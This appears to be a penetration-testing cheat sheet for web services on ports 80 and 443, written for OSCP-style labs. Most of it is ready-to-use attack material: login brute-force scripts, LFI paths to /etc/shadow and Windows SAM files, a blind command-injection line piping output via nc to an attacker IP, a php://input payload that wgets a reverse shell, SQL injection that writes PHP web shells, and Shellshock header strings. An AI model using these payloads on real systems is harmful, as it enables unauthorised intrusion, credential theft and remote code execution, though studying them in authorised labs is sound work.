# 80\_443\_HTTP\_S

* [Brute Force Login Screens](80_443_http_s.md#Brute-Force-Login-Screens)
* [Local File Inclusion Test](80_443_http_s.md#Local-File-Inclusion-Test)
  * [Evaluate Open Home Directories](80_443_http_s.md#Evaluate-Open-Home-Directories)
  * [Directory Traversal](80_443_http_s.md#Directory-Traversal)
  * [PHP Wrappers](80_443_http_s.md#PHP-Wrappers)
  * [Identify any PHP 'include' Functions](80_443_http_s.md#Identify-any-PHP-include-Functions)
* [Manual-SQL-Injection-Testing](80_443_http_s.md#Manual-SQL-Injection-Testing)
* [Heartbleed](80_443_http_s.md#Heartbleed-ippsecValentine)
* [Unknown Web Application](80_443_http_s.md#Unknown-Web-Application-ippsec-Nibbles)
* [SSRF](80_443_http_s.md#SSRF-ippsecKotarak)
* [PHPLiteAdmin](80_443_http_s.md#PHPLiteAdmin-ippsecNineveh-VulnhubZico2)
* [Content Management Systems \(CMS\)](80_443_http_s.md#Content-Management-Systems-CMS)
* [Shellshock](80_443_http_s.md#Shellshock)
* [Image Upload Restriction Bypass](80_443_http_s.md#Image-Upload-Restriction-Bypass-Vulnhubinit)

## Brute Force Login Screens

* Generally doesn't work but should be tried anyways in case it's low hanging fruit. 
* It is more likely to be successful if we already have some usernames that will likely work. 
* General usernames and passwords should also be tried but we can't have this list be too long because it will take time.
* Turn on proxy \(Burp or ZAP\) and capture requests.
* Attempt a general login. 
* Look at the request being sent to identify the method \(GET or POST\) to send the authentication credentials as well as the variable name for the username and password.
* See what keyword is displayed upon a failed login attempt.
* Create or use a list of usernames to attempt brute force login. [Default Username List](https://github.com/neogeo56/OSCP/blob/master/Web/Brute_Force/Default-Usernames.txt)
* Create or use a list of passwords to attempt brute force login. [Default Password List](https://github.com/neogeo56/OSCP/blob/master/Web/Brute_Force/rockyou-20.txt)
* Create a colon-seperated file of username and password combinations using the [UserPass\_List\_Maker.py](https://github.com/neogeo56/OSCP/blob/master/Web/Brute_Force/UserPass_List_Maker.py)

  ```text
  python3 UserPass_List_Maker.py [user list] [password list]
  ```

* Creates the colon-seperated file "User\_Pass.txt" in the directory the script was run from.
* Brute force login screen with [Web\_Brute\_Force\_2.py](https://github.com/neogeo56/OSCP/blob/master/Web/Brute_Force/Web_Brute_Force_2.py) python script.

  ```text
  python3 Web_Brute_Force_2.py -f/--file [colon seperated username:password file] -U/--URL [URL to the web application login form] -k/--keyword [Keyword in the HTML used to identify failed login attempts] -uP [HTTP parameter that passes the username] -pP [HTTP parameter that passes the password] -o [outfile location]
  ```

## Local File Inclusion Test

### Evaluate Open Home Directories

Apache by default creates a home directory for each user account and sometimes these home directories are accessible through web page navigation. 1. Compile a listing of usernames or guessed usernames. 2. In the web browser just attempt accessing home directories:

```text
[IP Address / Hostname]/~[username]
```

### Evaluate Open Directories \(Vulnhub:SickOS1.2\)

If we can get to a file system navigation \(like WebDAV\) then we should test the HTTP methods available to us. If PUT is available, then we can upload a shell to the current location and execute it through our file system navigation. 1. Identify an open file system navigation location. 2. Capture the HTTP request to this location and send it to Repeater. Change the HTTP method from GET to OPTIONS. 3. Identify if there is a PUT method available. 4. If so, you can upload a custom script or leverage an NMAP NSE script to upload a full file.

#### Custom Script

1. Change the method to PUT in a subsequent request.
2. Change the file path to

   ```text
   /\[path]/new_file_name.extension
   ```

3. Include the script you want to upload in the body of the HTTP request.  For example, a good example is [short PHP command execution](https://github.com/neogeo56/OSCP/blob/master/Web/PHP_Request_Value.txt)
4. Send the PUT request to create the file in the file location.

   **NMap NSE Put Script**

   ```text
   nmap -p 80 [ip] --script http-put --script-args http-put.url='[URL directory off the IP where the PUT method exists]/[new_file_name].[extension]',http-put.file='[local file location of file to upload].[extension]'
   ```

   1. Navigate to the script file location through a GET request to execute it.

### Directory Traversal

In areas of the application where we see directories hardcoded into the web address bar, we should try directory traversal attacks to see if we can navigate to any file on the system.

#### LFI Test Payloads

* Look for scripts that take filenames as parameters as they could not be sanitizing user input.  A good example is:

  ```text
  script.php?file=image.jpg
  ```

  * Look for any file on the webserver that is being served directly through a URL argument.

* Good resources include:
  * [Pre-made LFI fuzz list created from below repositories](https://github.com/neogeo56/Ops/blob/master/Web/Brute_Force/LFI_Test.txt)
  * [Simple LFI Payload Check](https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/simple-check.txt)
  * [Dot Dot Slash Payload Check](https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/dot-slash-PathTraversal_and_LFI_pairing.txt)
  * [Interesting Files](https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-InterestingFiles.txt)
  * [Nullbyte added](https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI_InterestingFiles-NullByteAdded.txt)

    **Xnix**

    ```text
    Http(s)://[web address]?[variable]=../../../../../[file location like etc/passwd or etc/resolve.conf]
    ```
* Try with no extension and then try with common extensions like .htm or .html or .txt 
* Also try to delete pre-filled extensions \(txt, php, etc.\) to see if we can get a verbose error message to pull threads on. 

  **ISS / Windows**

  ```text
  Http(s)://[web address]?[variable]=../../../../../../../../../../../../../../../../../[file location like \%systemroot%\system32\config]
  ```

  **Valuable File Locations To Read w/ LFI**

* SSH Key locations if Port 22 is open. 

  ```text
  Var/log/auth.log
  ```

* Understand what user the web server is running as.

  ```text
  /proc/self/status
  ```

  * Displays the UID/GID of the user which we have to cross-reference to the passwd file to identify the name.

* OS files for passwords. 

  ```text
  /etc/passwd
  ```

  ```text
  /etc/shadow
  ```

  * Generally can't read this unless the permissions to it are missconfigured.  If we can read this then we usually can read anything and it's over.

* See if the server stores the User-Agent value on-disk.

  ```text
  /proc/self/environ
  ```

  * If so, we can send a PHP reverse shell one-line through the HTTP-User-Agent header value.  Then navigate to this file to execute the reverse shell.

* Log poisoning

  ```text
  var/log/apace2/access.log
  ```

  * See if any of our input from interacting with the web application ends up in logs.  If we have the ability to control the input into the logs, we may be able to inject reverse shell one-lines into the log and then execute them with the LFI of observing the logs. \(ippsec:poison\)

* Windows Files

  ```text
  %windir%\repair\sam 
  %windir%\System32\config\RegBack\SAM 
  %windir%\repair\system 
  %windir%\repair\software 
  %windir%\repair\security 
  %windir%\debug\NetSetup.log (AD domain name, DC name, internal IP, DA account) 
  %windir%\iis6.log (5,6 or 7) 
  %windir%\system32\logfiles\httperr\httperr1.log 
  C:\sysprep.inf 
  C:\sysprep\sysprep.inf 
  C:\sysprep\sysprep.xml 
  %windir%\Panther\Unattended.xml 
  C:\inetpub\wwwroot\Web.config 
  %windir%\system32\config\AppEvent.Evt (Application log) 
  %windir%\system32\config\SecEvent.Evt (Security log) 
  %windir%\system32\config\default.sav 
  %windir%\system32\config\security.sav 
  %windir%\system32\config\software.sav 
  %windir%\system32\config\system.sav 
  %windir%\system32\inetsrv\config\applicationHost.config 
  %windir%\system32\inetsrv\config\schema\ASPNET_schema.xml 
  %windir%\System32\drivers\etc\hosts (dns entries) 
  %windir%\System32\drivers\etc\networks (network settings) 
  %windir%\system32\config\SAM (only really useful if you have access to the files while the machine is off)
  ```

### PHP Wrappers

* If within an HTTP request a .php file is shown or exposed, then you should attempt techniques below to flex the secure coding of PHP on the webserver. 
* When attempting these tests, look at the response through a web proxy as sometimes exploitation won't show up in the HTML.
* If we have command injection but it's blind, we can pipe the output to a nc session connecting back to the attacker IP that we're listening on.

  ```text
  [command]|nc [attacker IP] [port]
  ```

  * ippsec=Sense

    **php://filter**

* Attempt a PHP wrapper filter function around a PHP file location we know renders in the webpage to identify if the PHP is vulnerable to leaking PHP source code.

  ```text
  ...[file].php?[variable/page]=php://filter/convert.base64-encode/resource=[known file location that renders]
  ```

  * You shouldn't include the PHP extension in the URL because this command can only execute on php extension files of the web server because you are abusing a PHP command already.

* If successful, the base64 output of the PHP file is shown, which we can then copy to our attacker box and decode to read the plaintext version of any PHP file.

  **expect://LFI**

* Allows execution of system commands via the php expect wrapper.
* This functionality is not enabled by default.
* Attempt the PHP wrapper expect function in the URL executing a known system command \(ls\).

  ```text
  ...[file].php?[variable/page]=expect://[command]
  ```

* You will received the following error if the expect functionality is disabled on the target.

  ```text
  Warning: include(): Unable to find the wrapper "expect" ...
  ```

  **php://input**

* Your payload is sent in a POST request body.  So, usage of Burp / ZAP is best for this exploit.
* Usage of wget / curl to download a PHP script to the target is probably the easiest method.
* Modify the URL in the POST Request Header to include the input function.

  ```text
  ...?[variable/page]=php://input
  ```

* Input the PHP command in the body of the POST Request.

  ```text
  <? system('wget http://[attacker IP]/[perl reverse shell script].php -O [target file location like /var/www/shell.php');?>
  ```

* After upload of the script to the box, execute the reverse shell by simply navigating to the uploaded file location.

  ```text
  http://[target IP]/[uploaded file location]
  ```

  **.php?file=remote location \(ippsec=Poison\)**

* Create a reverse shell through a python HTTP server on port 80.
* Attempt to read a file hosted on the attacker box through the URL.

  ```text
  ...[file].php?file=http://[attacker IP]/[remote file].[extension]
  ```

  **Identify any PHP 'include' Functions**

* The 'include\(\)' function in PHP code is used to open files based on user input / variables.
* This function is commonly used insecurely in that if input is not sanitized appropriately, a user can force the web browser to automatically execute any PHP code that they point the web browser to on the target box.
* If we can upload a PHP reverse shell to any location on the target box, we can abuse the 'include\(\)' function LFI to execute the reverse shell back to our attacker machine.
  * A simple PHP command injection file that we can create allows us to input whatever command we want into an HTTP request to have it executed as long as another part of the HTTP request is navigating to this PHP file on the web server box and abusing the 'include' functionality.

    ```text
    <?php echo system ($_REQUEST['neogeo']); ?>
    ```

    ```text
    GET /?neogeo=[cmd]
    ```

  * A reliable PHP reverse shell can be found here [PHP Reverse Shell](https://github.com/neogeo56/OSCP/blob/master/Shells/php-reverse-shell.php).  Note that you have to adjust the IP and port variables in the shell before executing.

## Manual SQL Injection Testing

* Syntax varies between DB types - cheat sheets available here:
  * [General](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
  * [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/SQL-Injection)
  * Bypass: 
    * %00: Null-byte
    * Comment:
      * /_\[text\]_/
      * * \`
    * +: addition, concatenate \(or space in url\) substitutes for AND
    * \|\|: \(double pipe\) substitutes for OR.
    * %: wildcard attribute indicator
* Identify areas in the application that could be inputs for SQLi in the URL \(id=1\). 
* Proxy through ZAP to try [SQLi Test Payloads](https://github.com/neogeo56/OSCP/blob/master/Web/SQLi_Tests_Plaintext) to see instances where the payload doesn't result in an error on the page \(the website is processing the SQLi payload correctly to result in TRUE condition\). 
  * Alternatively, you can try some simple tests like adding an apostraphe to fields to see if they error out.  If they do, then they are likely vulnerable to some type of SQLi.  General bypass tests for login forms are below:

    ```text
    '||1=1#
    '||'a'='a'#
    ```
* Identify the number of columns in the current table by adding an additional value for each request \(1 then 1,2 then 1,2,3\).

  ```text
  .... ORDER BY 1,2,3,4,5,6....
  ```

* Once you get to a number that results in an error on the page, the total number of columns is less than the number that resulted in the error \(if it errored out on 7, then there are 6 columns in the current table\).
* Identify which columns show information on the screen. 

  ```text
  ... UNION ALL SELECT 1,2,3,4,5,6
  ```

* Which numbers of 1 - 6 show on the page is where we are going to put the query part of the payload \(We'll use 3 for rest of example\) 
* Fingerprint the DB 

  ```text
  ... UNION ALL SELECT 1,2,[version payload],4,5,6
  ```

* Identify current user you're issuing commands for 

  ```text
  .... UNION ALL SELECT 1,2,[current user payload],4,5,6
  ```

* List the current datbase you're working in 

  ```text
  ... UNION ALL SELECT 1,2,[current database payload],4,5,6
  ```

* List all of the databases available in the current view \(assuming MySQL for the rest - check cheat sheet for syntax\) 

_\*_NOTE: You may have to change the 1,2,etc. numbers in this command to null value to have the FROM syntax work in the injection tests after this step.

```text
... UNION ALL SELECT 1,2,[schema_name],4,5,6 FROM [information_schema.schemata]
```

1. List the tables available in the current database 

   ```text
   ... UNION ALL SELECT 1,2,[table_name],4,5,6 FROM [information_schema.tables]
   ```

2. Identify a table of interest that has account information. Then list the columns available in the that table 

   '''

   ... UNION ALL SELECT 1,2,\[column\_name\],4,5,6 FROM \[information\_schema.columns\] WHERE \[table\_name=\[table of interest\]\] 

   '''

   * Note that you LIKELY have to convert the table name to ASCII Character values to make this work. char\(65,66,67\) means ABC. Useful site to do this [link](http://www.unit-conversion.info/texttools/ascii/).

3. Output the contents of columns from a table. 

   ```text
   ... UNION ALL SELECT 1,2,[column_name],4,5,6 FROM [database_name].[table of interest]
   ```

4. Note: Prepend all of the available databases from the results of step 9 above to this command INCLUDING not appending any database.  If the command works without appending any database name, then the table you're interested in is already in the currently set database of the application you're exploiting SQLi from.
5. Load File Attempt 

   ```text
   union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
   ```

6. Attempt command injection \(Vulnhub:PwnOS2\) **Make sure to include a comment field at the end of the string syntax if it was found to be necessary when fuzzing the input field at the beginning of manaul SQLi testing.**

   ```text
   union all select null,null,null,null,"<?php passthru($_GET['cmd']); ?>",null INTO DUMPFILE "[location of the web directory like /var/www/[new name].php]"
   union all select null,null,null,null,"<?php shell_exec($_GET['cmd']); ?>",null INTO OUTFILE "[location of the web directory lik /var/www/[new name].php]"
   ```

   * The first command syntax with passthru and DUMPFILE works more often than the second.
   * Then you navigate to the standard web address and append "/\[new name\].php" to the end of the address.  If it works, then the file was created successfully from command injection.  To issue a command, you just append "?cmd=\[command\]".  For example.

     ```text
     http://10.10.10.100/evil.php?cmd=id
     ```

   * You can then inject a reverse shell for a call-back.

## Heartbleed \(ippsec:Valentine\)

### Background

* OpenSSL 1.0.1 through 1.0.1f \(inclusive\) are vulnerable. 
* OpenSSL 1.0.1g is NOT vulnerable.
* OpenSSL 1.0.0 branch is NOT vulnerable.
* OpenSSL 0.9.8 branch is NOT vulnerable.

### Exploit

```text
MSF > use auxiliary/scanner/ssl/openssl_heartbleed 
MSF > set RHOSTS [IP]
MSF > set verbose true 
MSF > run
```

* Try to connect to the port using the HTTP protocol instead of HTTPS as sometimes websites serve different content based on the protocol used to connect to the port / web application.

## Unknown Web Application \(ippsec: Nibbles\)

1. Banner grab the service running on the web port.
2. Google the name of the platform and find the most current version of it.
3. Download the application code release \(not from GitHub as it is generally not the most recent version\).
4. Find file locations within that application file structure that lists the version of the web application.  Leverage GREP and AWK to help with this.
5. Attempt to navigate to the file locations that could list a version number from the URL of the web application.
6. Searchsploit the web application and version numebr to see if there are any exploits available.
7. Check the installation guides for the web application \(and version if they differ by version\) for default credentials.

### SSRF \(ippsec:Kotarak\)

#### Background

* Server Side Request Forgery: When you use the target web server as a proxy to access other systems inside the company or outside the company.

  **Exploit**

* Identify a server that has the ability to redirect to other servers remotely based on our input.
* Test that it is vulnerable to SSRF by running a python web server on the attacker box and then instructing the target web server to reach out to your attacker python web server. If you see CLI entries on the attacker box, then the target web server is vulnerable to SSRF.
* Run a local port scan of the target server.

  ```text
  http://localhost:[port / port range]
  ```

  * You can use ZAP to cycle through each port number and the filter the responses by body size to identify the ports that are open on the localhost that you can navigate to through SSRF.
  * Wfuzz can also be leveraged to do this.

## PHPLiteAdmin \(ippsec:Nineveh\) \(Vulnhub:Zico2\)

* Common way to is to upload any text and then add a .php extension on it to make it executable.
* More information on how to do this exploit is in searchsploit record /exploits/php/webapps/24044.txt.
* Create new database with 1 field. 
* In the field, put PHP code with PHP tags.  Might have to use a single or a double quotes in the one-liner to make it work.
  * Best to start out with a very simple PHP command to display the PHP version info.

    ```text
    <?php phpinfo()?>
    ```

  * You can then try simple command injection.

    ```text
    <?php system ("ls"); ?>
    ```

  * You can then try to execute any command through a PHP variable in the URL.  Note that this may not work.

    ```text
    <?php echo system ($_REQUEST['teststring']); ?>
    ```
* Change the Type to Text for the field. Note that you don't have to put any value in the field.
* Rename the database to a name with the extension of .php.
* This gives us an opportunity to inject shellcode which can be executed with an LFI vulnerability on the web page to run the code.  If we execute with LFI, we just have to direct to the location of the database and then add a parameter \(teststring\) to inject whatever command we want.

  ```text
  ...?variable=[location of renamed DB from step 4].php
  ```

  ```text
  ...?variable=[location of renamed DB from step 4].php&teststring=[command]
  ```

* Once you've confirmed that command execution exists, then we can move onto a reverse shell script \(can be any reverse shell – not just a PHP one because we have direct OS command injection\).

## Content Management Systems \(CMS\)

* Usually have default creds like admin:admin.
* With Admin access:
  * Look for editing Themes, Plugins, File Uploads, Folders, or Backups as these functions almost always run PHP code to get code execution.  If we can't do things like edit and save these functions, then our access is likely read-only \(even if we're admin\) and not able to get code execution.

### Wordpress

* The login pages have a "Forgot Password" section which can allow you to enumerate valid and invalid usernames.
* If you have admin rights to the themes of the web application:
* Edit the header.php or 404.php pages to include a PHP reverse shell.
* Navigate to the web address where the edited page is to execute the reverse shell.

## Shellshock

### Background

* CVE-2014-7169, 6277, 7186, 7187
* Flaw in the way that Bash handled functions being defined within the environmental variables and exported them.
* Adversary identifies areas where input from attacker is used in a Bash environmental variable.

### Exploit

Attempt these exploit strings within HTTP Request Headers as that is the most common place vulnerable CGI Environmental Variables are located in web applications. 1. Non-blind Injection

```text
() { 1010;};echo;[full path to command]
```

* /usr/bin/id
* /bin/cat /etc/passwd
  1. Blind Injection

     ```text
     () { 1010;};echo;ping -c 1 [attacker IP]
     ```
* Need to have a python webserver running on the attacker machine on port 80.

  ```text
  () { 1010;};echo;sleep 10
  ```

* Wait 10 seconds to see if the injection was adhered to. \(ippsec:beep\)

## Image Upload Restriction Bypass \(Vulnhub:init\)

* If there are opportunities to upload documents / images to a server there will generally be some low-bar defensive code to ensure documents / images are not scripts.
* The below techniques are ones that can bypass most image upload defensive code techniques.
* Use of [Magic Numbers](https://en.wikipedia.org/wiki/List_of_file_signatures) to make any file look like a certain file type.  This ISO 8859-1 value should be the first line in the file to make it appear like certain file types.
  * You can test this by running a file command on the file.
* Insert the reverse shell or test code into the body of the file.
* Change the extension to something that is allowed.
  * file.php\[.gif\]

